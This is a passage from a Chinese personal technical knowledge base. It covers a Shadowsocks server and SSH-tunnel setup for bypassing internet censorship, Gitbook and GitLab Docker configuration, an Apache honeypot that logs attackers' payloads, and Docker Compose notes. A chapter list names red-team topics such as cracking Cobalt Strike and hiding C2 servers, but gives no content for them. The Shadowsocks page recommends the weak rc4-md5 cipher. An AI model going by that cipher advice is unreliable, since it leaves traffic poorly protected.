CentOS 执行命令 # 安装 python setup tools yum install python-setuptools -y #安装pip easy_install pip #升级 pip pip install –upgrade pip #安装 shadowsocks pip install shadowsocks 单独汇总一下，方便直接复制粘贴 yum install python-setuptools -y easy_install pip pip install –upgrade pip pip install shadowsocks Debian/Ubuntu apt-get install python-pip # 国内源都删了 pip install shadowsocks -i https://pypi.python.org/simple/ 有时 Ubuntu 会遇到第一个命令安装 python-pip 时找不到包的情况。pip 官方给出了一个安装脚本，可以自动安装 pip。先下载脚本，然后执行即可： wget https://bootstrap.pypa.io/get-pip.py python get-pip.py 配置ShadowSocks 创建配置文件 vi /etc/shadowsocks.json 然后输入如下内容 { \"server\":\"0.0.0.0\", \"server_port\":10010, \"password\":\"your_password\", \"timeout\":300, \"method\":\"rc4-md5\", \"fast_open\":true, \"workers\": 1 } 代码中各字段的含义 字段 说明 server 服务器 IP地址 (IPv4/IPv6) server_port 服务器监听的端口，一般设为80，443等，注意不要设为使用中的端口 password 设置密码，自定义 timeout 超时时间（秒） method 加密方法，可选择 “aes-256-cfb”,“rc4-md5”等等。推荐使用 “rc4-md5” fast_open true 或 false。如果你的服务器 Linux 内核在3.7+，可以开启 fast_open 以降低延迟。 workers workers数量，默认为 1。 启动Shadowsocks服务端 ssserver -c /etc/shadowsocks.json screen -dmS ssserver ssserver -c /etc/shadowsocks.json 启动可能会出现错误AttributeError: /lib/x86_64-linux-gnu/libcrypto.so.1.1: undefined symbol: EVP_CIPHER_CTX_cleanup 这是由于在openssl 1.1.0中废弃了 EVP_CIPHER_CTX_cleanup() 函数而引入了 EVE_CIPHER_CTX_reset() 函数所导致的 解决方案：https://floperry.github.io/2019/02/24/2018-06-25-Ubuntu-18.04-%E4%B8%8B%E8%A7%A3%E5%86%B3-shadowsocks-%E6%9C%8D%E5%8A%A1%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98/ 1、定位错误文件 2、修改错误文件 vim /usr/local/lib/python3.8/dist-packages/shadowsocks/crypto/openssl.py 3、搜索 cleanup 并将其替换为 reset 4、再次启动，出现如下内容说明成功 客户端连接服务端 配置 成功截图 其他 疑难杂症 启动后发现客户端连接不上的情况，可能是因为服务器供应商的安全策略，有2种解决方案： 上供应商的平台去开启安全策略，允许非正常端口访问 替换为其他的端口，如80、8080等默认允许访问的端口 同类产品 go语言shadowsocks：https://github.com/shadowsocks/go-shadowsocks2 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-27 10:04:24 "},"个人知识库/04.暂未分类/01.代理类/02.SSH加密隧道-科学上网临时手段.html":{"url":"个人知识库/04.暂未分类/01.代理类/02.SSH加密隧道-科学上网临时手段.html","title":"02.SSH加密隧道-科学上网临时手段","keywords":"","body":" 前言 前期准备 创建端口转发 浏览器配置 优缺点 前言 有时候可能买的机场突然到期了，或者自建的服务被封掉了等等等等，又急需科学上网，那么可以通过下文的手法快速达到目的。 国内的VPS需要下载软件，但是软件在国外，也可以使用这个+proxychains的方法来快速下载 前期准备 一台能科学上网的Linux服务器（性能没什么要求，最好是香港、日本、台湾、韩国、新加坡这些地方的，因为到中国大陆的延迟较为稳定） 本地能ping通那一台Linux服务器 创建端口转发 在本地执行如下命令即可： ssh -N -D local_addr:local_port username@jump-server-addr ssh -N -D 127.0.0.1:9999 root@vultr # -D 后面跟本地IP和开放隧道的端口 # 最后是root@服务器IP 运行后没有任何提示，那么就说明OK了 如果想在后台运行，可以加个参数 -f ssh -f -N -D 127.0.0.1:9999 root@vultr 浏览器配置 浏览器配置一般随便找个支持socks5代理的插件即可，如FoxyProxy，正确配置即可 然后挂上代理就可以用了，速度也挺快 优缺点 优点是 SSH是Linux/Mac系统自带工具，不需要额外安装任何东西（Windows上安装了ssh也可以用），而且这是一个日常工作中使用极其普遍的工具，防火墙不太可能完全封锁，所以目前还有一定的可用性。 缺点是 连接质量完全取决于远程服务器的IP质量，而得到一个清白的IP很多时候只能靠运气。碰到质量差的IP，即使能连上也会经常掉线，掉线后重连的连通率低，很浪费时间，这个问题在你开着它下载大量数据时会更明显，会让下载变得十分痛苦。SSH翻墙基本不可能用来下载BT，很快会断线，如果被VPS厂商封掉电脑IP，要等很久才能重新连上。这种翻墙方法只适合流量不大的开网页收发邮件。 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-02-25 10:10:22 "},"个人知识库/04.暂未分类/02.GIT/1.gitbook.html":{"url":"个人知识库/04.暂未分类/02.GIT/1.gitbook.html","title":"1.gitbook","keywords":"","body":" 安装 初始化 写目录 更新 启动WEB 生成静态网站 安装插件 常用插件 快速生成summary flexible-alerts 高级格式显示的提示块 page-treeview 生成页内目录 二次修改插件 其他 问题 [!Note] https://www.latelee.org/my-study/gitbook-note.html https://jiangminggithub.github.io/gitbook/1-install.html 安装 需要node 10.x，不然后面初始化会报错 npm install -g gitbook-cli 初始化 gitbook init 初始化过后会多2个文件，分别是 README.md（书籍的介绍在这个文件里） SUMMARY.md（书籍的目录结构在这里配置） 写目录 可以参考最下面的一键生成 * [CS](CS/CS.md) * [1.破解CS](CS/破解CS.md) * [2.Malleable C2 Profiles](CS/Malleable-C2-Profiles.md) * [3.启动](CS/启动.md) * [4.目录和菜单中文说明](CS/目录和菜单中文说明.md) * [5.Beacon](CS/Beacon.md) * [6.进阶：隐藏C2 - 通过特征](CS/进阶：隐藏C2 - 通过特征.md) * [7.进阶：隐藏C2 - 通过CDN](CS/进阶：隐藏C2 - 通过CDN.md) * 内网 * [1.内网基础知识整理](内网/1.内网基础知识整理.md) * [2.Kerberos协议](内网/2.kerberos协议.md) * [3.委派](内网/3.委派.md) * [4.ACL](内网/4.ACL.md) * [5.域环境搭建](内网/5.域环境搭建.md) * [6.内网渗透流程](内网/6.内网渗透流程.md) * [7.网络环境的判断](内网/7.网络环境的判断.md) * [8.内网权限提升](内网/8.内网权限提升.md) * [9.信息收集](内网/9.信息收集.md) * [10.横向移动](内网/10.横向移动.md) * [11.工具小结](内网/11.工具小结.md) * [12.攻击手法](内网/12.攻击手法.md) 更新 写完目录后再次执行gitbook init Gitbook会查找SUMMARY.md中描述的目录和文件，如果没有则会创建。上面的目录运行后是这样的 启动WEB gitbook serve 生成静态网站 gitbook build --format website 安装插件 新建book.json输入以下内容 [!NOTE] 这些都是我自己使用的插件，算是做个备份汇总吧 { \"title\" : \"d4m1ts 知识库\", \"author\" : \"d4m1ts\", \"description\" : \"个人的部分知识技能，倾向于使用知识库的方式进行总结回顾自己\", \"theme-default\": { \"showLevel\": true }, \"plugins\": [ \"-lunr\", \"-search\", \"search-plus\", \"-highlight\", \"chapter-fold\", \"expandable-chapters\",\"splitter\", \"page-treeview\", \"lightbox\", \"donate\", \"hide-element\", \"code\", \"tbfed-pagefooter\", \"pageview-count\", \"ancre-navigation\", \"anchor-navigation-ex\", \"insert-logo\", \"favicon\",\"github\",\"flexible-alerts\",\"prism\",\"copyright\" ], \"pluginsConfig\": { \"page-treeview\": { \"copyright\": \"Copyright &#169; d4m1ts\", \"minHeaderCount\": \"2\", \"minHeaderDeep\": \"2\" }, \"donate\": { \"wechat\": \"/README.assets/wx.jpeg\", \"alipay\": \"/README.assets/alipay.jpeg\", \"title\": \"\", \"button\": \"打赏☕️\", \"alipayText\": \"支付宝打赏\", \"wechatText\": \"微信打赏\" }, \"hide-element\": { \"elements\": [\".gitbook-link\", \".treeview__copyright\", \".treeview__main-title\"] }, \"tbfed-pagefooter\": { \"copyright\":\"Copyright &copy d4m1ts 2022\", \"modify_label\": \"该文章修订时间：\", \"modify_format\": \"YYYY-MM-DD HH:mm:ss\" }, \"insert-logo\": { \"url\": \"/README.assets/logo.png\", \"style\": \"background: none; max-height: 40px; min-height: 40px\" }, \"favicon\": { \"shortcut\": \"/README.assets/favicon.ico\", \"bookmark\": \"/README.assets/favicon.ico\", \"appleTouch\": \"/README.assets/favicon.ico\", \"appleTouchMore\": { \"120x120\": \"/README.assets/favicon.ico\", \"180x180\": \"/README.assets/favicon.ico\" } }, \"github\": { \"url\": \"https://github.com/damit5\" }, \"flexible-alerts\": { \"style\": \"callout\", \"comment\": { \"label\": \"Comment\", \"icon\": \"fa fa-comments\", \"className\": \"info\" } }, \"prism\": { \"css\": [ \"prismjs/themes/prism-tomorrow.css\" ], \"lang\": { \"flow\": \"typescript\" }, \"ignore\": [ \"mermaid\", \"eval-js\", \"ascii\", \"result\", \"manifest\", \"payload\", \"google\", \"tree\", \"java_out\", \"log4j2\", \"jsp\", \"class\", \"Exception\", \"stack\" ] }, \"copyright\": { \"site\": \"https://blog.gm7.org/\", \"author\": \"d4m1ts\", \"website\": \"d4m1ts 知识库\", \"image\": \"\", \"copyProtect\": true } } } 然后运行 gitbook install 然后启动就可以了 gitbook serve https://www.jianshu.com/p/2160f1ba68a0 常用插件 # 全面 https://jiangminggithub.github.io/gitbook/6-third_plugins.html https://www.jianshu.com/p/427b8bb066e6 https://segmentfault.com/a/1190000019806829 http://jartto.wang/2020/02/02/about-gitbook/ https://juejin.cn/post/6844903865146441741 https://github.com/orgs/GitbookIO/repositories?type=all https://github.com/search?q=gitbook-plugin-&type=all 快速生成summary https://blog.csdn.net/weixin_34383618/article/details/91629912 npm install -g gitbook-summary book sm book sm -i node_modules,_book # 忽略 node_modules和_book目录 flexible-alerts 高级格式显示的提示块 用法： > [!type|style:xx|label:xx|icon:xx|className:xx|labelVisibility:xx|iconVisibility:xx] > 内容部分 字段介绍，如果不设置的表示选择默认，除了!type都不是必需的。 键 允许的值 说明 !type NOTE，TIP，WARNING和DANGER 警告级别设置 style 以下值之一: callout（默认）, flat 警告样式，见图19的左右不同 label 任何文字 警告块的标题位置，即Note这个字段位置（不支持中文） icon e.g. 'fa fa-info-circle' 一个有效的Font Awesome图标，那块小符号 className CSS类的名称 指定css文件，用于指定外观 labelVisibility 以下值之一：visible（默认），hidden 标签是否可见 iconVisibility 以下值之一：visible（默认），hidden 图标是否可见 实例： 1. 这是简单的用法 > [!NOTE] > 这是一个简单的Note类型的使用，所有的属性都是默认值。 --- 2. 这是自定义属性的用法 > [!NOTE|style:flat|lable:Mylable|iconVisibility:hidden] > \"!type\":`NOTE`、\"style\":`flat`、\"lable\":`自定义标签`、图标不可见 1、Note [!NOTE] 这是一个简单的Note类型的使用，所有的属性都是默认值。 2、TIP [!TIP] TIPS 3、WARNING [!WARNING] WARNING|WARNING 4、DANGER [!DANGER] DANGER 5、自定义 [!COMMENT] 自定义的，在book.json中配置 6、正常 正常测试 7、高级使用 [!NOTE|style:flat|lable:Mylable] \"!type\":NOTE、\"style\":flat、\"lable\":自定义标签、图标可见 page-treeview 生成页内目录 生成后，会出现这一行，想要删除有2种方法： 直接用hide-element来隐藏，治标不治本 直接修改插件源码node_modules/gitbook-plugin-page-treeview/lib/index.js，删除如下部分即可 二次修改插件 有时候一些插件不太合心意，可以稍微修改修改 [!TIP|style:flat] 修改其他插件一样，找到路径就行了，node_modules/gitbook-plugin-xxx里面的index.js 主要参考上面的page-treeview修改 本网站主要修改了2个插件： page-treeview copyright：去除了最下面的版权信息，因为感觉不好看。。。 其他 https://github.com/snowdreams1006/gitbook-plugin-readmore https://snowdreams1006.github.io/gitbook-plugin-copyright/dev/zero2one.html 问题 gitbook的模板引擎会渲染一些内容，可能因为内容会抛出异常Template render error: https://stackoverflow.com/questions/41498252/gitbook-template-render-error-unknown-block-tag-static 举一些可能抛出异常的例子，用代码块``正常格式和起来就行 - `{{ }}` * `{{ }}` ```test {{ aaa }} ``` Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-08 20:44:22 "},"个人知识库/04.暂未分类/02.GIT/2.gitlab搭建.html":{"url":"个人知识库/04.暂未分类/02.GIT/2.gitlab搭建.html","title":"2.gitlab搭建","keywords":"","body":" 前言 过程 安装 映射目录说明 一些问题 设置root密码 配置自己的证书 集成证书 配置HTTP跳转 配置SSH端口 关闭自带NGINX 配置Nginx反向代理 邮箱配置 上传文件过大 开启邮箱验证 禁用avatar头像 前言 需要用到Gitlab，但是其他地方的不放心，看了下有docker版的，所以搭一个记录一下。 过程 安装 [!NOTE] 主要参考官方文档：https://docs.gitlab.com/ee/install/docker.html#install-gitlab-using-docker-compose 安装好docker后，创建一个docker-compose.yml，如下： version: '3.6' services: web: image: 'gitlab/gitlab-ee:latest' restart: always hostname: 'gitlab.gm7.org' environment: GITLAB_OMNIBUS_CONFIG: | # Add any other gitlab.rb configuration here, each on its own line external_url 'https://gitlab.gm7.org' gitlab_rails['gitlab_shell_ssh_port'] = 2222 ports: - '80:80' - '443:443' - '2222:22' volumes: - '/srv/gitlab/config:/etc/gitlab' - '/srv/gitlab/logs:/var/log/gitlab' - '/srv/gitlab/data:/var/opt/gitlab' shm_size: '256m' 然后执行如下命令即可： docker-compose up -d 等它ok，gitlab就搭建好了，没啥技术含量 映射目录说明 GitLab中主要三个目录需要被映射出来，分别是 /etc/gitlab : 配置文件目录。GitLab的主要配置文件 gitlab.rb 保存在这个目录 /var/opt/gitlab ：GitLab的运行目录和数据保存目录 /var/log/gitlab : GitLab的日志目录 一些问题 配置设置：https://docs.gitlab.com/omnibus/settings/ 设置root密码 设置其他信息，比如邮箱啥的，都一样 网上全部都说访问第一次网页会提示设置root密码，然而我没看到设置root密码的地方，就找到了另一种方法：直接进容器里面改 docker exec -it gitlab_web_1 /bin/bash # 执行后等它加载完 gitlab-rails console -e production # 获取root用户 user = User.where(id: 1).first # 设置密码 user.password = 'test123...' user.password_confirmation = 'test123...' # 保存 user.save! # 退出 exit 去网页端登陆，OK 配置自己的证书 gitlab会在 config/ssl 目录下生成自签名证书，但因为没有CA认证，所以重配置命令最后会报证书检查错误，不过不影响配置生效，浏览器会有安全警告，需要手动接受证书或者访问会被阻止。 如果有CA认证证书，可以按照以下步骤安装和配置 首先将认证证书和密钥文件放置在 config/ssl 目录下，然后修改NGINX的SSL证书配置（config/github.rb中）。例如： nginx['ssl_certificate'] = \"/etc/gitlab/ssl/gitlab.gm7.org.pem\" nginx['ssl_certificate_key'] = \"/etc/gitlab/ssl/gitlab.gm7.org.key\" 保存配置修改后，执行 docker exec -it gitlab_web_1 gitlab-ctl reconfigure 使变更生效。接下来就可以完全正常的通过浏览器访问安全地址了。 [!WARNING] 必须要将 external_url 配置为HTTPS地址，GitLab才会开启HTTPS，只配置证书不会开启HTTPS。 集成证书 gitlab可以自动集成Let's Encrypt的证书，而无需我们配置 修改conf/gitlab.rb，对主域的Let's Encrypt支持： letsencrypt['enable'] = true # GitLab 10.5 and 10.6 require this option external_url \"https://gitlab.example.com\" # Must use https protocol letsencrypt['contact_emails'] = ['foo@email.com'] # Optional 自动更新SSL证书，还是修改配置文件，默认配置文件是每4天午夜的时候更新，也可以使用如下配置 letsencrypt['auto_renew'] = true # This example renews every 7th day at 12:30 letsencrypt['auto_renew_hour'] = \"12\" letsencrypt['auto_renew_minute'] = \"30\" letsencrypt['auto_renew_day_of_month'] = \"*/7\" 手动更新SSL证书 gitlab-ctl renew-le-certs 刷新配置 gitlab-ctl reconfigure 配置HTTP跳转 当HTTPS开启之后，GitLab会关闭HTTP访问。此时可以配置GitLab将HTTP请求转发到HTTPS，但不能只以HTTP方式访问。 修改 config/gitlab.rb 修改以下配置： nginx['redirect_http_to_https'] = true nginx['redirect_http_to_https_port'] = 80 保存配置修改后，执行 docker exec -it gitlab_web_1 gitlab-ctl reconfigure 使变更生效。此时，再访问HTTP地址，就会跳转到HTTPS。 配置SSH端口 使用Docker部署GitLab，由于一般22端口已经被宿主服务器使用了，需要将GitLab SSH服务的22端口映射到其他端口。接下来以使用2222端口为例。 [!NOTE] 上面我们已经用本地2222端口映射了内部的22端口了，所以不需要再单独映射了 修改 config/gitlab.rb gitlab_rails['gitlab_shell_ssh_port'] = 8122 保存配置修改后，执行 docker exec -it gitlab_web_1 gitlab-ctl reconfigure 使变更生效。 关闭自带NGINX GitLab自带的NGINX可以关闭，但此时需要配置Workhorse服务，因为默认情况下Workhorse只监听Unix Socket。 在 config/gitlab.rb 中添加以下配置： nginx['enable'] = false gitlab_workhorse['listen_network'] = \"tcp\" gitlab_workhorse['listen_addr'] = \"0.0.0.0:8181\" 上例中的配置将使Workhorse监听8181端口。保存配置修改后，执行 docker exec -it gitlab_web_1 gitlab-ctl reconfigure 使变更生效。 [!WARNING] 在启动容器时需要将Workhorse监听的端口映射出来。 配置Nginx反向代理 通常情况下都会在GitLab前放置一个Nginx做为服务的反向代理。这时，需要对Nginx和GitLab的配置都做出调整。 例如，首先在用来做反向代理的Nginx中，添加以下服务配置： upstream gitlab-workhorse { server 192.168.1.18:8181; } server { listen *:80; server_name my-gitlab; server_tokens off; gzip on; proxy_set_header Host $http_host_with_default; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; location / { proxy_cache off; proxy_pass http://gitlab-workhorse; } } 以上配置中，假设GitLab服务监听的是 192.168.1.18 上的 8181 端口。X-Real-IP和X-Forwarded-For两个Header用来向GitLab服务传递客户端的真实IP。 为了让GitLab后端能够正常从 X-Real-IP 和 X-Forwarded-For 中读取客户端的IP，需要在 config/gitlab.rb 添加以下配置： nginx['real_ip_trusted_addresses'] = ['192.168.1.0/24', '172.17.0.0/24'] 当Nginx代理也是Docker容器时，其IP有可能是172.17.0.0网段，所以这里也在配置中添加了这个网段。 [!WARNING] 无论GitLab自带的Nginx服务是否开启，都需要添加这个配置 邮箱配置 参考：https://docs.gitlab.com/omnibus/settings/smtp.html?spm=a2c6h.12873639.0.0.5edfaf686YW1R0#smtp-settings 修改 config/gitlab.rb 还有 保存配置修改后，执行使变更生效。 docker exec -it gitlab_web_1 gitlab-ctl reconfigure 邮件发送测试（发送标题和正文不能包含中文） docker exec -it gitlab_web_1 /bin/bash # 控制台，等几分钟 gitlab-rails console # 发送测试邮件 Notify.test_email('收件人邮箱', '邮件标题', '邮件正文').deliver_now 上传文件过大 提示 error: RPC failed; HTTP 413 curl 22 The requested URL returned error: 413 Request Entity Too Large 出现以上问题同样是因为上传软件包过大，需要我们在nginx参数中进行调整设置文件传输大小的限制。需要注意的是，如果是反向代理的Gitlab需要我们将两台服务器的nginx都进行设置。 grep -r \"client_max_body_size\" /srv/gitlab config/gitlab.rb设置 nginx['client_max_body_size'] = '1024m' [!TIP] 还是不行建议用ssh 开启邮箱验证 禁用avatar头像 头像服务器在国外，开启头像可能会因为加载不出来头像而阻塞正常图片的加载 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-12 16:43:59 "},"个人知识库/04.暂未分类/03.蜜罐/01.apache简易蜜罐.html":{"url":"个人知识库/04.暂未分类/03.蜜罐/01.apache简易蜜罐.html","title":"01.apache简易蜜罐","keywords":"","body":" 前言 Apache配置 方法一：使用mod_dumpio 方法二：安装mod_security 网站部署 扩展 隐藏Server信息 重写路由 前言 github上已经有很多开源的蜜罐产品了，但是感觉都不是我想要的，我想要的是360的Anglerfish这种蜜罐，能够伪造web服务，欺骗攻击者，获取web攻击的payload情况 但是很遗憾，没在网上找到这款产品，暂且当它是内部的吧，所以只能自己简单的抄袭一个出来 之前用flask写了一个，感觉效果很理想，就是bug比较多；所以这次准备直接用成熟的apache来搭建部署。 核心思路：定义一个包含敏感内容的模板html，让所有请求都返回这个结果，apache记录所有请求日志 Apache配置 本次使用版本： apache默认情况下，是只会记录请求的头部信息，如方法、路由、GET参数和UA等，保存在/var/log/apache2/access.log下（可以通过配置修改）；但是如果是POST的请求，是不能看到传输的数据的，而我们作为蜜罐，则需要记录所有的请求内容 因此我们需要开启apache的post数据记录功能 方法一：使用mod_dumpio [!note] apache自带的插件，但是格式很乱，且mod_dumpio在第一个空字符处停止记录二进制有效负载。例如，gzip文件的multipart/form-data上传可能仅显示mod_dumpio的前几个字节。 执行下列命令： sudo a2enmod dump_io systemctl restart apache2 编辑apache的配置文件/etc/apache2/apache2.conf，添加如下内容 vim /etc/apache2/apache2.conf LoadModule dumpio_module modules/mod_dumpio.so DumpIOInput On DumpIOOutput On #DumpIOLogLevel DEBUG # apache 2.2 version LogLevel dumpio:trace7 # apache 2.4 再次重启apache systemctl restart apache2 此后，所有的数据都将会记录到错误日志/var/log/apache2/error.log中 此时记录post的数据就大功告成了 方法二：安装mod_security # 安装 sudo apt install libapache2-mod-security2 -y # 使用推荐的配置文件 sudo mv /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf # 重新加载Apache sudo service apache2 reload 查看记录的日志/var/log/apache2/modsec_audit.log 其他可参考的/etc/modsecurity/modsecurity.conf配置；modSecurity规则学习（一）——配置文件 SecRuleEngine On SecAuditEngine On SecAuditLog /var/log/apache2/modsec_audit.log SecRequestBodyAccess on SecAuditLogParts ABIJDFHZ 网站部署 有了日志记录的功能，我们还需要一个蜜罐界面，最好是包括各种产品信息的，如 http://199.247.15.174:8089/ http://80.240.20.208:8089/ 查看源码，可以看到里面有大量的伪造信息，来方便搜索引擎抓取 直接copy下来，可以点击我下载 给它放到/var/www/html目录下，然后访问IP或者配置的域名，出现一样的界面就说明OK了，大体就完成了 扩展 隐藏Server信息 这个header还是太明显了，可以修改apache的配置文件/etc/apache2/apache2.conf来隐藏 在配置文件中添加几行（需要安装mod_security），参考：http://www.modsecurity.cn/chm/SecServerSignature.html SecServerSignature \"Microsoft-IIS/6.0\" 效果 重写路由 访问一些不存在的页面会返回404，就暴露了，所以我们可以重写一下路由，访问任意链接都返回首页index.html 执行如下命令： sudo a2enmod rewrite systemctl restart apache2 vim /etc/apache2/sites-available/000-default.conf 添加如下内容： Options Indexes FollowSymLinks MultiViews AllowOverride All Require all granted 再次重启apache systemctl restart apache2 创建并编辑/var/www/html/.htaccess vim /var/www/html/.htaccess 写入如下内容 RewriteEngine On RewriteRule ^.*?$ index.html [NC] 参考：How To Rewrite URLs with mod_rewrite for Apache on Ubuntu 16.04 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-02-09 09:57:25 "},"个人知识库/04.暂未分类/04.docker/docker compose模板文件.html":{"url":"个人知识库/04.暂未分类/04.docker/docker compose模板文件.html","title":"docker compose模板文件","keywords":"","body":" 前置知识 简介 实例 flask+redis启动代码 Dockerfile docker-compose.yml 编译和运行 扩展 compose详解 build command container_name depends_on environment expose image network_mode ports secrets volumes 其他指令 读取变量 扩展 Docker通过代理build 减少镜像大小 前置知识 YAML 是 \"YAML Ain't a Markup Language\"（YAML不是一种标记语言）的递归缩写。在开发的这种语言时，YAML 的意思其实是：\"Yet Another Markup Language\"（仍是一种标记语言）。 YAML 的语法和其他高级语言类似，并且可以简单表达清单、散列表，标量等数据形态。它使用空白符号缩进和大量依赖外观的特色，特别适合用来表达或编辑数据结构、各种配置文件、倾印调试内容、文件大纲（例如：许多电子邮件标题格式和YAML非常接近）。 YAML 的配置文件后缀为.yml https://www.runoob.com/w3cnote/yaml-intro.html 简介 docker compose 在 Docker 容器运用中具有很大的学习意义，docker compose 是一个整合发布应用的利器。而使用 docker compose 时，懂得如何编排 docker compose 配置文件是很重要的。 官方参考文档：https://docs.docker.com/compose/ 使用compose一般有3步： 使用Dockerfile定义应用的环境 在docker-compose.yml中定义需要运行的服务 执行docker-compose up来启动运行整个应用 一个docker-compose.yml大概长这样 version: \"3.9\" # optional since v1.27.0 services: web: build: . ports: - \"8000:5000\" volumes: - .:/code - logvolume01:/var/log links: - redis redis: image: redis volumes: logvolume01: {} 使用compose可以管理应用的整个生命周期 Start, stop, and rebuild services View the status of running services Stream the log output of running services Run a one-off command on a service 实例 官网python flask + redis的实例，通过走一遍流程来巩固一下基础知识 flask+redis启动代码 运行在docker容器中的服务 创建app.py，写入如下内容 import time import redis from flask import Flask app = Flask(__name__) cache = redis.Redis(host='redis', port=6379) def get_hit_count(): retries = 5 while True: try: return cache.incr('hits') except redis.exceptions.ConnectionError as exc: if retries == 0: raise exc retries -= 1 time.sleep(0.5) @app.route('/') def hello(): count = get_hit_count() return 'Hello World! I have been seen {} times.\\n'.format(count) 创建依赖文件requirements.txt flask redis Dockerfile 通过Dockerfile来创建一个docker镜像，这个镜像会解决所有的依赖问题，如python环境、pthon依赖等 指令详解：https://yeasy.gitbook.io/docker_practice/image/dockerfile 内容如下： # syntax=docker/dockerfile:1 FROM python:3.7-alpine WORKDIR /code ENV FLASK_APP=app.py ENV FLASK_RUN_HOST=0.0.0.0 RUN apk add --no-cache gcc musl-dev linux-headers COPY requirements.txt requirements.txt RUN pip install -r requirements.txt EXPOSE 5000 COPY . . CMD [\"flask\", \"run\"] 解释： 以最小的python3.7的镜像为基础构建 设置工作目录为/code 设置flask启动时需要的环境变量 在容器中安装gcc和一些其他的依赖 给requirements.txt复制到容器中 在容器中安装依赖 声明容器开放5000端口（为了规范，好像没啥大用） 给当前目录复制到WORKDIR中 运行flask run docker-compose.yml 定义compose需要用到的其他镜像服务 创建docker-compose.yml，写入如下内容： version: \"3.9\" services: web: build: . ports: - \"8000:5000\" volumes: - .:/code environment: FLASK_ENV: development redis: image: \"redis:alpine\" 定义了2个服务，一个是web，一个是redis web服务：通过Dockerfile编译而来，本地的8000端口对应容器内的5000，code挂载到当前目录，可以实时修改代码，环境变量设置了flask以开发模式运行 redis服务：直接从dockerhub pull下来就能用，所以无需多余的配置 编译和运行 此时文件结构： . ├── Dockerfile ├── app.py ├── docker-compose.yml └── requirements.txt 运行 # -d表示后台运行 docker-compose up -d 然后就OK了 扩展 # 查看启动的容器 docker-compose ps # 执行命令 docker-compose run web env # 停止compose docker-compose stop compose详解 完整的参考：https://yeasy.gitbook.io/docker_practice/compose/compose_file 这里记录一些自己常用的 build 指定 Dockerfile 所在文件夹的路径（可以是绝对路径，或者相对 docker-compose.yml 文件的路径）。 Compose 将会利用它自动构建这个镜像，然后使用这个镜像。 version: '3' services: webapp: build: ./dir 你也可以使用 context 指令指定 Dockerfile 所在文件夹的路径。 使用 dockerfile 指令指定 Dockerfile 文件名。 使用 arg 指令指定构建镜像时的变量。 version: '3' services: webapp: build: context: ./dir dockerfile: Dockerfile-alternate args: buildno: 1 使用 cache_from 指定构建镜像的缓存 build: context: . cache_from: - alpine:latest - corp/web_app:3.14 command 覆盖容器启动后默认执行的命令。 command: echo \"hello world\" container_name 指定容器名称。默认将会使用 项目名称_服务名称_序号 这样的格式。 container_name: docker-web-container depends_on 解决容器的依赖、启动先后的问题。以下例子中会先启动 redis db 再启动 web version: '3' services: web: build: . depends_on: - db - redis redis: image: redis db: image: postgres environment 设置环境变量。你可以使用数组或字典两种格式。 可以通过如下两种方法查看： docker inspect OR docker exec -it OR env 只给定名称的变量会自动获取运行 Compose 主机上对应变量的值，可以用来防止泄露不必要的数据。 environment: RACK_ENV: development SESSION_SECRET: environment: - RACK_ENV=development - SESSION_SECRET 如果变量名称或者值中用到 true|false，yes|no 等表达布尔含义的词汇，最好放到引号里，避免 YAML 自动解析某些内容为对应的布尔语义。这些特定词汇，包括 y|Y|yes|Yes|YES|n|N|no|No|NO|true|True|TRUE|false|False|FALSE|on|On|ON|off|Off|OFF expose 暴露端口，但不映射到宿主机，只被连接的服务访问。 仅可以指定内部端口为参数 expose: - \"3000\" - \"8000\" image 指定为镜像名称或镜像 ID。如果镜像在本地不存在，Compose 将会尝试拉取这个镜像。 image: ubuntu image: orchardup/postgresql image: a4bc65fd network_mode 设置网络模式。使用和 docker run 的 --network 参数一样的值。 network_mode: \"bridge\" network_mode: \"host\" network_mode: \"none\" network_mode: \"service:[service name]\" network_mode: \"container:[container name/id]\" ports 映射端口信息。 使用宿主端口：容器端口 (HOST:CONTAINER) 格式，或者仅仅指定容器的端口（宿主将会随机选择端口）都可以。 ports: - \"3000\" - \"8000:8000\" - \"49100:22\" - \"127.0.0.1:8001:8001\" secrets 存储敏感数据，例如 mysql 服务密码。 version: \"3.1\" services: mysql: image: mysql environment: MYSQL_ROOT_PASSWORD_FILE: /run/secrets/db_root_password secrets: - db_root_password - my_other_secret secrets: my_secret: file: ./my_secret.txt my_other_secret: external: true volumes 数据卷所挂载路径设置。可以设置为宿主机路径(HOST:CONTAINER)或者数据卷名称(VOLUME:CONTAINER)，并且可以设置访问模式 （HOST:CONTAINER:ro）。 该指令中路径支持相对路径。 volumes: - /var/lib/mysql - cache/:/tmp/cache - ~/configs:/etc/configs/:ro 如果路径为数据卷名称，必须在文件中配置数据卷。 version: \"3\" services: my_src: image: mysql:8.0 volumes: - mysql_data:/var/lib/mysql volumes: mysql_data: 其他指令 此外，还有包括 domainname, entrypoint, hostname, ipc, mac_address, privileged, read_only, shm_size, restart, stdin_open, tty, user, working_dir 等指令，基本跟 docker run 中对应参数的功能一致。 模拟一个伪终端： tty: true 指定容器退出后的重启策略为始终重启。该命令对保持服务始终运行十分有效，在生产环境中推荐配置为 always 或者 unless-stopped。 restart: always 读取变量 Compose 模板文件支持动态读取主机的系统环境变量和当前目录下的 .env 文件中的变量。 例如，下面的 Compose 文件将从运行它的环境中读取变量 ${MONGO_VERSION} 的值，并写入执行的指令中。 version: \"3\" services: db: image: \"mongo:${MONGO_VERSION}\" 如果执行 MONGO_VERSION=3.2 docker-compose up 则会启动一个 mongo:3.2 镜像的容器；如果执行 MONGO_VERSION=2.8 docker-compose up 则会启动一个 mongo:2.8 镜像的容器。 若当前目录存在 .env 文件，执行 docker-compose 命令时将从该文件中读取变量。 # 支持 # 号注释 MONGO_VERSION=3.6 扩展 Docker通过代理build 有时候build镜像，源什么都没换，直接国内去访问就很慢很卡，可以通过如下的方法来加快速度。 代理需要改成自己的 docker build --build-arg \"HTTP_PROXY=http://10.8.194.13:1081/\" --build-arg \"HTTPS_PROXY=http://10.8.194.13:1081/\" -t testproxy . 测试用dockerfile FROM ubuntu:latest RUN apt update && apt install curl -y RUN curl 